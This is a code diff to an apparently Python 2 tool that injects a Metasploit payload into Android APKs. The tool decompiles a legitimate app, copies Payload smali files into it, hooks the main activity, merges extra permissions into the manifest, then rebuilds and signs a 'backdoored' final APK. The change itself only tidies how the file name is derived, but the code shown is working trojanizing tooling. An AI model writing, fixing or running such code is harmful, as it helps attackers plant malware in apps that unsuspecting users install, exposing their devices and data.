@@ -31,13 +31,14 @@ def decompile(mainapk):
 
 def inject(mainapk):
 	print pyc.Info("Injecting payload...")
-	mk = "mkdir %s/smali/com/metasploit"%mainapk.split('.')[0]
+	mainapkname = os.path.splitext(mainapk)[0]
+	mk = "mkdir %s/smali/com/metasploit"%mainapkname
 	os.system(mk)
-	mk = "mkdir %s/smali/com/metasploit/stage"%mainapk.split('.')[0]
+	mk = "mkdir %s/smali/com/metasploit/stage"%mainapkname
 	os.system(mk)
-	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/"%mainapk.split('.')[0]
+	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/"%mainapkname
 	os.system(cp)
-	filemanifest = "%s/AndroidManifest.xml"%mainapk.split('.')[0]
+	filemanifest = "%s/AndroidManifest.xml"%mainapkname
 	fhandle = open(filemanifest,'r')
 	fread = fhandle.read()
 	fhandle.close()
@@ -45,7 +46,7 @@ def inject(mainapk):
 	acn = re.search('android:name=\"[\w.]+',fread)
 	activityname = acn.group(0).split('"')[1]
 	acpath = activityname.replace('.','/') + ".smali"
-	smalipath = "%s/smali/%s"%(mainapk.split('.')[0], acpath)
+	smalipath = "%s/smali/%s"%(mainapkname, acpath)
 	fhandle = open(smalipath,'r')
 	fread = fhandle.read()
 	fhandle.close()
@@ -61,6 +62,7 @@ def inject(mainapk):
 
 def permissions(mainapk):
 	print pyc.Info("Adding permissions...")
+	mainapkname = os.path.splitext(mainapk)[0]
 	filemanifest = "temp/AndroidManifest.xml"
 	fhandle = open(filemanifest,'r')
 	fread = fhandle.readlines()
@@ -69,7 +71,7 @@ def permissions(mainapk):
 		if('<uses-permission' in line):
 			prmns.append(line.replace('\n',''))	
 	fhandle.close()
-	filemanifest = "%s/AndroidManifest.xml"%mainapk.split('.')[0]
+	filemanifest = "%s/AndroidManifest.xml"%mainapkname
 	fhandle = open(filemanifest,'r')
 	fread = fhandle.readlines()
 	half=[]
@@ -94,10 +96,11 @@ def permissions(mainapk):
 	
 def rebuild(mainapk):
 	print pyc.Info("Recompiling...")
-	rebuild = "./apktool.sh b -f %s"%mainapk.split('.')[0]	
+	mainapkname = os.path.splitext(mainapk)[0]
+	rebuild = "./apktool.sh b -f %s"%mainapkname	
 	os.system(rebuild)
 	print pyc.Info("Signing apk...")
-	path = "%s/dist/%s"%(mainapk.split('.')[0],mainapk)
+	path = "%s/dist/%s"%(mainapkname,mainapk)
 	signapk = "java -jar signapk.jar cert.x509.pem privatekey.pk8 %s %s-final.apk"%(path,mainapk[:-4])
 	os.system(signapk)
 	print pyc.Succ("Successfully backdoored and saved as %s-final.apk"%mainapk[:-4])
